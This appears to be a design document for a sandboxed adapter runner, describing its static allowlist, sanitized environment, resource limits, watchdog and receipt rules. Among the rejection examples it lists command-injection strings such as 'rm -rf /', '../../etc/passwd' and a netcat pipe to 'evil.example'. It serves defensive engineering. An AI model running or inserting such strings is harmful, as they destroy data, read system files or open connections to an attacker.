# Fixed-entrypoint bounded runner (WP-D31, M1)

This document describes the bounded execution runner introduced in WP-D31:
its **fixed entrypoints** (no raw commands), the **subprocess sandbox** that
surrounds each adapter run, the **receipt-last** invariant, and the
**macOS network caveat**. It is the companion to the Python model under
`src/srl/execution/` and the acceptance gate at `scripts/checks/wp31-gate.py`.

> The runner executes **adapters**, never raw commands. An adapter id is an
> opaque key looked up in a static allowlist; it is never split, interpolated,
> or passed to a shell. A green run means a bounded step produced a validated
> output; it never means a scientific claim is *supported* (see `GOVERNANCE.md`).

## Scope

WP-D31 wires the runner that WP-D30 prepared the policy for. It calls
`admit` and `preflight` (from WP-D30) and then — only for an admitted step —
launches the fixed `srl.execution.child` module under the sandbox described
here. It does not itself admit or park; that is WP-D30's job.

| Concern                       | Artifact                              | Python module                  |
|-------------------------------|---------------------------------------|--------------------------------|
| Adapter allowlist (static)    | `echo.v1`, `uppercase.v1`             | `srl.execution.entrypoints`    |
| Fixed child entrypoint        | `python -m srl.execution.child`       | `srl.execution.child`          |
| Sandbox (env, limits, kill)   | `build_child_env`, `ResourceLimits`   | `srl.execution.sandbox`        |
| Runner orchestration          | `run_adapter` → `RunOutcome`          | `srl.execution.runner`         |
| Run receipt (success only)    | `RunReceipt/v1`                       | `srl.execution.runner`         |
| Acceptance gate               | `GateReceipt/v1` (WP-D31)             | `scripts/checks/wp31-gate.py`  |

The `srl.execution` package remains **standard library only** — it has no
dependency on the scientific contracts layer (and its `jsonschema` runtime
dependency) — so the runner and its child run in any environment, including a
minimal CI runner.

## Fixed entrypoints: no raw commands

The single most important property of the runner is that **there is no path
from untrusted input to a shell**. Concretely:

- The adapter id is looked up in a **static allowlist**
  (`srl.execution.entrypoints`). The allowlist is a frozen dict built at import
  time; there is no `register` function that accepts data. Adding an adapter is
  a code change.
- An unknown id — including anything shaped like command injection
  (`echo.v1; rm -rf /`, `../../etc/passwd`, `` echo.v1`whoami` ``,
  `echo.v1$(id)`, `echo.v1| nc evil.example 4444`) — raises
  `UnknownAdapterError` (`fail_reason='CONTRACT_INVALID'`) **at lookup**, before
  any `subprocess.Popen` is constructed. No process is created for an unknown id.
- The command line is a fixed list:
  `[python, -m, srl.execution.child, <adapter_id>, <input_file>, <output_file>]`.
  It is executed directly (no `shell=True` anywhere in the runner). The adapter
  id is an inert positional argument; even if it contained metacharacters, no
  shell would evaluate them.

There is no `eval`, no `importlib` import from a caller-supplied string, and no
`subprocess` of an arbitrary path. The allowlist is static code.

### Shipped adapters

Two adapters ship with WP-D31:

| Adapter       | Input                      | Output                       | Purpose                              |
|---------------|----------------------------|------------------------------|--------------------------------------|
| `echo.v1`     | `{value?: any}`            | `{value?: any}`              | Golden/conformance baseline; no-op.  |
| `uppercase.v1`| `{text: str}`              | `{text: str}` (upper-cased)  | Exercises schema validation + shape. |

Both are `deterministic=true` and carry a minimal `input_schema` /
`output_schema` used by the child to validate a payload before and after the
handler runs.

## The subprocess sandbox

Each run spawns the fixed child in its own process group under a set of
hard caps. The sandbox is assembled in `srl.execution.sandbox`.

### Sanitized environment

`build_child_env` constructs the child environment **from scratch**. The parent
`os.environ` is never inherited. Only these keys are set:

- `PATH` — a fixed minimal list (`/usr/local/bin:/usr/bin:/bin`).
- `HOME`, `TMPDIR` — point at the sandbox-local scratch tree.
- `LANG=C.UTF-8` — deterministic decoding.
- `PYTHONHASHSEED=0` — deterministic hash ordering.
- `PYTHONPATH` (when needed) — points at the in-repo `srl` package root so the
  fixed `-m srl.execution.child` entrypoint is importable. This is **not** a
  leak: it points at the same package the orchestrator is running from, never at
  parent secrets.

A parent-only env var (e.g. a secret token) therefore never reaches the child.
The WP-D31 gate (D31-02) asserts this with a canary env var.

> **macOS note.** The CFoundation layer injects `__CF_USER_TEXT_ENCODING` into
> the child automatically regardless of the env dict passed to `Popen`; that
> value is derived from the UID, not from the parent environ, and is not a leak
> of a parent secret. The canary test asserts our specific canary is absent,
> not that the child env is exactly our dict.

### Private scratch

`prepare_scratch` creates a directory under `tempfile.mkdtemp` with mode
`0o700` (owner-only read/write/execute). The input payload is written there as
canonical JSON and then `chmod 0o400` (read-only), so the child cannot mutate
its own input.

### POSIX resource limits

The child's `preexec_fn` applies these caps before `exec`:

| Limit        | Source                       | Cap (M1)     | Behaviour on exceed                |
|--------------|------------------------------|--------------|------------------------------------|
| `RLIMIT_AS`  | `policy.default.rss_bytes`   | 1.5 GiB      | MemoryError / SIGSEGV (Linux)      |
| `RLIMIT_CPU` | `wall_seconds + 1`           | ~301 s       | SIGXCPU after CPU budget           |
| `RLIMIT_FSIZE`| output cap                  | 1 MiB        | SIGXFSZ / OSError on write         |
| `RLIMIT_NOFILE`| fixed                      | 256          | EMFILE on open                     |
| `RLIMIT_NPROC`| fixed                       | 256          | EAGAIN on fork                     |

A **mandatory** limit that cannot be set (e.g. `setrlimit` raises) aborts the
run **before exec** with `LimitSetupError` (`fail_reason='RESOURCE_LIMIT'`) —
the run never starts with unbounded resources. `RLIMIT_AS` is **best-effort**:

> **macOS note.** On macOS arm64 the kernel refuses to lower `RLIMIT_AS` below
> the current hard limit (`current limit exceeds maximum limit`). On macOS the
> other limits (CPU, FSIZE, NOFILE, NPROC) are still applied and the wall
> timeout plus the output cap act as the memory backstop. Full address-space
> enforcement is realised on Linux (CI). The sandbox is therefore conservative
> everywhere and strict on Linux.

### Process-group watchdog and orphan check

The child is started with `start_new_session=True`, so its PID is the process-
group leader. On timeout or output-cap breach, the watchdog:

1. `os.killpg(SIGTERM)` the whole group;
2. waits a 5-second grace;
3. `os.killpg(SIGKILL)` if anything remains.

After the kill, `verify_no_orphan` walks the process table (`/proc` on Linux,
`ps -axo pgid` on macOS/BSD) for any process whose process-group id still
matches the child's. A survivor is an `ORPHAN_PROCESS_DETECTED` hard stop
(`hard_stop=true`): the cage leaked and the run is recorded as
`policy_violation` with no receipt.

### Output capture with byte caps

`stdout` and `stderr` are each drained by a reader thread into a capped buffer
(default 1 MiB per stream). An over-cap stream sets `truncated=True`, the child
is killed, and the run is classified `resource_limit` with no receipt. The cap
is enforced reader-side (not by the kernel), so it is identical on every
platform.

## The receipt-last invariant

A `RunReceipt/v1` is written to scratch **only after** the child's output
validates against the adapter's output schema. A policy violation, a timeout, a
resource limit, or a contract/handler failure **never** produces a receipt.

| Status             | When                                          | Receipt? |
|--------------------|-----------------------------------------------|----------|
| `completed`        | Child exited 0 and output validated.          | **Yes**  |
| `failed`           | Child exited 2 (contract/handler failure).    | No       |
| `timeout`          | Wall watchdog killed the child.               | No       |
| `resource_limit`   | Output cap / RLIMIT fired; no orphan.         | No       |
| `policy_violation` | An orphan survived the watchdog kill.         | No       |

The receipt is canonical JSON (`RunReceipt/v1`) carrying the adapter id, the
status, the observed usage (wall, rss, output bytes), and the path to the
validated output. It is an **execution-engine** receipt, not a scientific-
evidence one — it does not import or depend on `srl.semantic.evidence`.

## macOS network caveat (observational only)

The runner's sandbox does not grant network access, and no shipped adapter
performs network I/O. **Network denial is observational only on macOS**: the
sandbox does not implement a network namespace or an egress filter, so a
malicious adapter that opened a socket would not be blocked at the kernel level
by this WP alone. The protection in M1 is that **only credential-free, reviewed
packs run locally**, and every adapter is a static, reviewed entry in the
allowlist — there is no path from untrusted input to a handler that could open
a socket. A future WP may add an explicit egress filter; until then, the
allowlist is the network-safety boundary.

## Running the gate

```bash
python3 scripts/checks/wp31-gate.py          # bare (adds src/ to sys.path)
# or
uv run python scripts/checks/wp31-gate.py     # under the locked env
```

The gate prints one canonical `GateReceipt/v1` JSON line and exits 0 only if
all six checks PASS. The check IDs are D31-01 through D31-06 (see the gate's
module docstring). The gate enables the test-only adapter hook
(`SRL_RUNNER_TEST_ADAPTERS=1`) internally to exercise the timeout/output-cap/
fork/bomb paths; this env var is a test signal (it loads a fixed in-repo module,
not caller data) and is never set in production.
